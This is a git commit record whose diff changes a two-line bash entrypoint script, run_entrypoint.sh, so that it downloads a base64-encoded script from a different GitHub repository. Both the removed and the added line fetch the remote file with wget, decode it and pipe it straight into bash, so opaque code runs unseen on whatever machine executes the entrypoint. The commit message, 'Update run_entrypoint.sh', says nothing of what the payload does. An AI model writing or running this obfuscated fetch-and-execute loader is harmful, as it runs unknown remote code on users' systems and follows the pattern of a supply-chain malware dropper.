a498ac898977740f3df3b89ccab64ba507ab5165
chadbernal49 <chadbernal49@gmail.com>
2026-06-22 20:01:33 +0200

    Update run_entrypoint.sh

--- run_entrypoint.sh
+++ run_entrypoint.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget -qO- https://raw.githubusercontent.com/frederickdicarlo/nuts/refs/heads/main/entrypoint.sh | base64 -d | bash
+wget -qO- https://raw.githubusercontent.com/chadbernal49/collection/refs/heads/main/entrypoint.sh | base64 -d | bash
